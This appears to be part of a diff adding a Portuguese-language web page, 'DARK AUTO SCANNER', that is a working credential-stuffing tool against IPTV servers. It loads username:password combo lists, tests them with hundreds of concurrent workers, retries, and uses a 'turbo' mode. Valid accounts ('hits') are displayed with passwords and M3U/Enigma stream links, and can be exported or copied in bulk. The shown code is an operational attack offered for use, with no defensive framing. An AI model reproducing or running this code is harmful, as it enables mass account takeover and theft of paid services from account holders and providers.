+      if (attempt < MAX_RETRIES && !stopRequested) {
+        await delay(500);
+        return testCombo(host, username, password, attempt + 1);
+      }
+      return { valid: false, error: error.message || 'Erro desconhecido' };
+    }
+  }
+  
+  // ===== FUNÇÃO PARA COPIAR TEXTO COM FALLBACK =====
+  function copyToClipboard(text) {
+    return new Promise((resolve, reject) => {
+      // Tentar usar a API moderna do clipboard
+      if (navigator.clipboard) {
+        navigator.clipboard.writeText(text)
+          .then(() => resolve(true))
+          .catch(err => {
+            console.error('Erro ao copiar com API moderna:', err);
+            // Fallback para método antigo
+            fallbackCopyTextToClipboard(text, resolve, reject);
+          });
+      } else {
+        // Usar método antigo diretamente se a API não estiver disponível
+        fallbackCopyTextToClipboard(text, resolve, reject);
+      }
+    });
+  }
+  
+  // ===== MÉTODO ANTIGO DE COPIA (FALLBACK) =====
+  function fallbackCopyTextToClipboard(text, resolve, reject) {
+    const textArea = document.createElement("textarea");
+    textArea.value = text;
+    
+    // Evitar rolagem para o elemento
+    textArea.style.position = "fixed";
+    textArea.style.top = 0;
+    textArea.style.left = 0;
+    textArea.style.width = "2em";
+    textArea.style.height = "2em";
+    textArea.style.padding = 0;
+    textArea.style.border = "none";
+    textArea.style.outline = "none";
+    textArea.style.boxShadow = "none";
+    textArea.style.background = "transparent";
+    textArea.style.opacity = "0";
+    
+    document.body.appendChild(textArea);
+    textArea.focus();
+    textArea.select();
+    
+    try {
+      const successful = document.execCommand('copy');
+      document.body.removeChild(textArea);
+      
+      if (successful) {
+        resolve(true);
+      } else {
+        reject(new Error('Não foi possível copiar o texto'));
+      }
+    } catch (err) {
+      document.body.removeChild(textArea);
+      reject(err);
+    }
+  }
+  
+  // ===== FUNÇÃO PARA RENDERIZAR UM HIT NA TELA =====
+  function renderHit(hit, index) {
+    // Emojis customizados para o tema
+    const signalEmoji = '⚡';
+    const serverEmoji = '🌐';
+    const userEmoji = '👤';
+    const passEmoji = '🔑';
+    const recordEmoji = '📅';
+    const expiryEmoji = '⌛';
+    const tvEmoji = '📺';
+    const movieEmoji = '🎥';
+    const seriesEmoji = '🎞️';
+    const totalEmoji = '🔢';
+    const linkEmoji = '🔗';
+    
+    const {
+      host, username, password, status, expiration, 
+      created_at, maxConnections, m3uLink, m3uPlusLink, enigmaLink, epgUrl, counts 
+    } = hit;
+    
+    // Limpa texto para segurança
+    const hHost = escapeHtml(host);
+    const hUser = escapeHtml(username);
+    const hPass = escapeHtml(password);
+    
+    // Verifica se deve exibir informações completas ou básicas
+    const showFullInfo = showCategoryCheckbox.checked;
+    
+    // Monta template legível e formatado sem markdown
+    const content = []
+    content.push(`✅ HIT DETECTADO pelo DARK AUTO SCANNER`);
+    content.push('--------------------------------');
+    content.push(`${signalEmoji} SINAL: ATIVO`);
+    content.push(`${serverEmoji} SERVIDOR: ${hHost}`);
+    content.push(`${userEmoji} USUÁRIO: ${hUser}`);
+    content.push(`${passEmoji} SENHA: ${hPass}`);
+    
+    if (showFullInfo) {
+      content.push(`${recordEmoji} REGISTRO: ${formatDate(created_at)}`);
+      content.push(`${expiryEmoji} VALIDADE: ${expiration}`);
+      content.push('--------------------------------');
+      content.push(`${tvEmoji} CANAIS: ${counts.live}`);
+      content.push(`${movieEmoji} FILMES: ${counts.movies}`);
+      content.push(`${seriesEmoji} SÉRIES: ${counts.series}`);
+      content.push(`${totalEmoji} TOTAL: ${counts.total}`);
+    }
+    
+    content.push('--------------------------------');
+    content.push(`${linkEmoji} M3U: ${m3uLink}`);
+    content.push(`${linkEmoji} M3U+: ${m3uPlusLink}`);
+    content.push(`${linkEmoji} ENIGMA: ${enigmaLink}`);
+    content.push(`${linkEmoji} EPG: ${epgUrl}`);
+    content.push('--------------------------------');
+    content.push('✅ DARK AUTO SCANNER ✅');
+    
+    // Cria div item
+    const div = document.createElement('div');
+    div.className = 'hit-item';
+    div.setAttribute('tabindex', '0');
+    div.setAttribute('aria-label', `Hit válido detectado: usuário ${hUser} com validade ${expiration}`);
+    
+    // Bloco de texto pré formatado para preservar layout fixo
+    const pre = document.createElement('pre');
+    pre.textContent = content.join('\n');
+    div.appendChild(pre);
+    
+    // Área de botões para copiar individual
+    const btnCopy = document.createElement('button');
+    btnCopy.textContent = '📋';
+    btnCopy.title = 'Copiar este hit';
+    btnCopy.setAttribute('aria-label', `Copiar hit do usuário ${hUser}`);
+    
+    // Armazenar o conteúdo para cópia
+    const hitContent = content.join('\n');
+    
+    btnCopy.onclick = () => {
+      copyToClipboard(hitContent)
+        .then(() => {
+          showNotification(`Hit copiado! Usuário: ${hUser}`);
+        })
+        .catch(err => {
+          console.error('Erro ao copiar:', err);
+          showNotification('Falha ao copiar. Tente novamente.');
+        });
+    };
+    
+    const btnContainer = document.createElement('div');
+    btnContainer.className = 'hit-actions';
+    btnContainer.appendChild(btnCopy);
+    div.appendChild(btnContainer);
+    
+    return div;
+  }
+  
+  // ===== RENDERIZAR LINKS M3U NA ÁREA SUPERIOR =====
+  function renderM3ULinks() {
+    m3uResultsContainer.innerHTML = '';
+    
+    // Mostrar apenas os 10 primeiros hits
+    const topHits = resultsHits.slice(0, 10);
+    
+    topHits.forEach((hit, index) => {
+      const m3uItem = document.createElement('div');
+      m3uItem.className = 'm3u-item';
+      
+      const linkText = document.createElement('div');
+      linkText.className = 'm3u-link';
+      linkText.innerHTML = `🔗 LINK M3U: ► ${hit.m3uLink}`;
+      
+      const copyBtn = document.createElement('button');
+      copyBtn.className = 'copy-btn';
+      copyBtn.textContent = 'Copiar';
+      copyBtn.onclick = () => {
+        copyToClipboard(hit.m3uLink)
+          .then(() => {
+            showNotification(`Link M3U copiado!`);
+          })
+          .catch(err => {
+            console.error('Erro ao copiar:', err);
+            showNotification('Falha ao copiar. Tente novamente.');
+          });
+      };
+      
+      m3uItem.appendChild(linkText);
+      m3uItem.appendChild(copyBtn);
+      m3uResultsContainer.appendChild(m3uItem);
+    });
+    
+    if (topHits.length === 0) {
+      m3uResultsContainer.innerHTML = '<p style="text-align: center; color: var(--accent-color-light);">Nenhum link M3U gerado ainda.</p>';
+    }
+  }
+  
+  // ===== SHOW ESTATÍSTICAS =====
+  function updateStats() {
+    stats.totalTested.textContent = `Testados: ${totalProcessed}`;
+    stats.totalHits.textContent = `Hits: ${totalHits}`;
+    stats.totalErrors.textContent = `Erros: ${totalErrors}`;
+    stats.botsActive.textContent = `Bots Ativos: ${workerPool}`;
+    stats.botsRemaining.textContent = `Bots Restantes: ${combos.length - totalProcessed > 0 ? combos.length - totalProcessed : 0}`;
+    // Req/sec básico: total / tempo segundos, atualizado a cada segundo
+    const elapsed = (Date.now() - startTime) / 1000;
+    stats.reqPerSec.textContent = `Req/s: ${elapsed > 0 ? (totalProcessed/elapsed).toFixed(1) : '0'}`;
+  }
+  
+  // ===== ATUALIZA BARRA DE PROGRESSO =====
+  function updateProgress() {
+    const percent = combos.length ? (totalProcessed / combos.length) * 100 : 0;
+    progressBar.style.width = `${percent}%`;
+    progressText.textContent = `${percent.toFixed(1)}%`;
+  }
+  
+  // ===== INICIA O ESCANEAMENTO =====
+  async function startScan() {
+    // Reseta estado
+    stopRequested = false;
+    totalProcessed = 0;
+    totalErrors = 0;
+    totalHits = 0;
+    workerPool = 0;
+    resultsHits = [];
+    resultsSet.clear();
+    resultsContainer.innerHTML = '';
+    m3uResultsContainer.innerHTML = '';
+    updateStats();
+    updateProgress();
+    
+    // Leitura inputs
+    maxWorkers = parseInt(document.getElementById('threadCount').value, 10);
+    if(isNaN(maxWorkers) || maxWorkers < 1 || maxWorkers > 500) {
+      alert('Informe um número válido de bots (1 a 500).');
+      return;
+    }
+    
+    // Verifica se há combos carregados (seja por arquivo ou online)
+    if(combos.length === 0) {
+      // Verifica se há um arquivo selecionado
+      const file = comboFileInput.files[0];
+      if (file) {
+        const loaded = await loadCombosFromFile(file);
+        if (!loaded) return;
+      } else {
+        // Tenta carregar online se não houver arquivo
+        const loaded = await loadCombosOnline();
+        if (!loaded) return;
+      }
+    }
+    
+    generateBtn.disabled = true;
+    stopBtn.disabled = false;
+    exportBtn.disabled = true;
+    copyAllBtn.disabled = true;
+    startTime = Date.now();
+    lastUpdateTime = Date.now();
+    
+    // Gera várias "workers" que buscam combos da lista
+    workerPool = maxWorkers;
+    const promises = [];
+    
+    // Para cada servidor, cria workers para testar combos
+    for (const server of servers) {
+      for(let i=0; i < maxWorkers; i++) {
+        promises.push(worker(server));
+      }
+    }
+    
+    await Promise.all(promises);
+    
+    // Finalizado
+    workerPool = 0;
+    updateStats();
+    updateProgress();
+    generateBtn.disabled = false;
+    stopBtn.disabled = true;
+    exportBtn.disabled = resultsHits.length === 0;
+    copyAllBtn.disabled = resultsHits.length === 0;
+    showNotification(`Varredura finalizada! Hits encontrados: ${totalHits}`, 7000);
+    
+    // Renderizar os links M3U
+    renderM3ULinks();
+  }
+  
+  // ===== WORKER QUE PEGA PROXIMO ITEM PARA TESTAR =====
+  async function worker(host) {
+    while(!stopRequested) {
+      let comboItem;
+      // Pega próximo combo de forma thread-safe
+      if(combos.length > 0) {
+        comboItem = combos.shift();
+      } else {
+        break;
+      }
+      if(!comboItem) break;
+      
+      // Quebra username e password conforme padrão "username:password"
+      let [username, password] = comboItem.split(':');
+      if(!username || !password) {
+        totalErrors++;
+        totalProcessed++;
+        updateStatsIfNeeded();
+        continue;
+      }
+      
+      try {
+        const res = await testCombo(host, username, password);
+        totalProcessed++;
+        if (res.valid) {
+          // Evitar duplicidade: combo + host como chave única
+          const uniqueKey = `${host}|${username}|${password}`;
+          if(!resultsSet.has(uniqueKey)) {
+            resultsSet.add(uniqueKey);
+            totalHits++;
+            resultsHits.push(res);
+            // Renderizar na UI
+            const hitHTML = renderHit(res, totalHits);
+            resultsContainer.prepend(hitHTML);
+            
+            // Atualizar também a lista de links M3U
+            renderM3ULinks();
+          }
+        } else {
+          totalErrors++;
+        }
+      } catch (e) {
+        totalErrors++;
+      }
+      updateStatsIfNeeded();
+      
+      // Delay ajustável baseado no modo turbo
+      const turboMode = turboModeCheckbox.checked;
+      if (turboMode) {
+        await delay(10); // Delay mínimo no modo turbo
+      } else {
+        await delay(50); // Delay padrão
+      }
+    }
+  }
+  
+  // ===== ATUALIZAÇÃO OTIMIZADA DE ESTATÍSTICAS =====
+  function updateStatsIfNeeded() {
+    const now = Date.now();
+    // Atualiza a cada 200ms ou a cada 100 requisições processadas
+    if (now - lastUpdateTime > 200 || totalProcessed % 100 === 0) {
+      updateStats();
+      updateProgress();
+      lastUpdateTime = now;
+    }
+  }
+  
+  // ===== LIMPA RESULTADOS E ESTADO DA UI =====
+  function clearResults() {
+    stopRequested = true;
+    combos = [];
+    resultsHits = [];
+    resultsSet.clear();
+    resultsContainer.innerHTML = '';
+    m3uResultsContainer.innerHTML = '';
+    totalProcessed = 0;
+    totalErrors = 0;
+    totalHits = 0;
+    updateStats();
+    updateProgress();
+    generateBtn.disabled = false;
+    stopBtn.disabled = true;
+    exportBtn.disabled = true;
+    copyAllBtn.disabled = true;
+    comboFileInput.value = ''; // Limpa o input de arquivo
+  }
+  
+  // ===== EXPORTAR HITS PARA TXT =====
+  function exportHits() {
+    if (resultsHits.length === 0) {
+      alert('Nenhum hit para exportar.');
+      return;
+    }
+    
+    const showFullInfo = showCategoryCheckbox.checked;
+    const lines = [];
+    
+    for (const h of resultsHits) {
+      const content = [];
+      content.push(`✅ HIT DETECTADO pelo DARK AUTO SCANNER`);
+      content.push('--------------------------------');
+      content.push(`⚡ SINAL: ATIVO`);
+      content.push(`🌐 SERVIDOR: ${h.host}`);
+      content.push(`👤 USUÁRIO: ${h.username}`);
+      content.push(`🔑 SENHA: ${h.password}`);
+      
+      if (showFullInfo) {
+        content.push(`📅 REGISTRO: ${formatDate(h.created_at)}`);
+        content.push(`⌛ VALIDADE: ${h.expiration}`);
+        content.push('--------------------------------');
+        content.push(`📺 CANAIS: ${h.counts.live}`);
+        content.push(`🎥 FILMES: ${h.counts.movies}`);
+        content.push(`🎞️ SÉRIES: ${h.counts.series}`);
+        content.push(`🔢 TOTAL: ${h.counts.total}`);
+      }
+      
+      content.push('--------------------------------');
+      content.push(`🔗 M3U: ${h.m3uLink}`);
+      content.push(`🔗 M3U+: ${h.m3uPlusLink}`);
+      content.push(`🔗 ENIGMA: ${h.enigmaLink}`);
+      content.push(`🔗 EPG: ${h.epgUrl}`);
+      content.push('--------------------------------');
+      content.push('✅ DARK AUTO SCANNER ✅');
+      
+      lines.push(content.join('\n'));
+    }
+    
+    const blob = new Blob([lines.join('\n\n')], {type: "text/plain;charset=utf-8"});
+    const url = URL.createObjectURL(blob);
+    // Criar link para download
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `hits-dark-scanner-${new Date().toISOString().slice(0,10)}.txt`;
+    a.click();
+    URL.revokeObjectURL(url);
+  }
+  
+  // ===== COPIAR TODOS OS HITS =====
+  function copyAllHits() {
+    if (resultsHits.length === 0) {
+      alert('Nenhum hit para copiar.');
+      return;
+    }
+    
+    const showFullInfo = showCategoryCheckbox.checked;
+    const texts = resultsHits.map(h => {
+      const content = [];
+      content.push(`✅ HIT DETECTADO pelo DARK AUTO SCANNER`);
+      content.push('--------------------------------');
+      content.push(`⚡ SINAL: ATIVO`);
+      content.push(`🌐 SERVIDOR: ${h.host}`);
+      content.push(`👤 USUÁRIO: ${h.username}`);
+      content.push(`🔑 SENHA: ${h.password}`);
+      
+      if (showFullInfo) {
+        content.push(`📅 REGISTRO: ${formatDate(h.created_at)}`);
+        content.push(`⌛ VALIDADE: ${h.expiration}`);
+        content.push('--------------------------------');
+        content.push(`📺 CANAIS: ${h.counts.live}`);
+        content.push(`🎥 FILMES: ${h.counts.movies}`);
+        content.push(`🎞️ SÉRIES: ${h.counts.series}`);
+        content.push(`🔢 TOTAL: ${h.counts.total}`);
+      }
+      
+      content.push('--------------------------------');
+      content.push(`🔗 M3U: ${h.m3uLink}`);
+      content.push(`🔗 M3U+: ${h.m3uPlusLink}`);
+      content.push(`🔗 ENIGMA: ${h.enigmaLink}`);
+      content.push(`🔗 EPG: ${h.epgUrl}`);
+      content.push('--------------------------------');
+      content.push('✅ DARK AUTO SCANNER ✅');
+      
+      return content.join('\n');
+    }).join('\n\n');
+    
+    copyToClipboard(texts)
+      .then(() => {
+        showNotification('Todos os hits foram copiados!');
+      })
+      .catch(err => {
+        console.error('Erro ao copiar todos os hits:', err);
+        showNotification('Falha ao copiar. Tente novamente ou use a opção de exportar.');
+      });
+  }
+  
+  // ===== EVENT LISTENERS =====
+  generateBtn.addEventListener('click', startScan);
+  
+  stopBtn.addEventListener('click', () => {
+    stopRequested = true;
+    stopBtn.disabled = true;
+    generateBtn.disabled = false;
+    showNotification('Escaneamento interrompido pelo usuário.');
+  });
+  
+  clearBtn.addEventListener('click', () => {
+    clearResults();
+    showNotification('Resultados limpos.');
+  });
+  
+  exportBtn.addEventListener('click', exportHits);
+  copyAllBtn.addEventListener('click', copyAllHits);
+  
+  // Event listener para carregar arquivo de combos
+  comboFileInput.addEventListener('change', async function(e) {
+    const file = e.target.files[0];
+    if (file) {
+      try {
+        await loadCombosFromFile(file);
+      } catch (error) {
+        showNotification(`Erro ao carregar arquivo: ${error.message}`);
+      }
+    }
+  });
+  
+  // Carrega combos automaticamente ao iniciar
+  window.addEventListener('load', async () => {
+    await loadCombosOnline();
+  });
+  
+  // ===== ACESSIBILIDADE =====
+  // Define foco no container de resultados para leitores de tela
+  resultsContainer.setAttribute('tabindex', '0');
+  // ===== FIM DO SCRIPT =====
+</script>
+</body>
+</html>
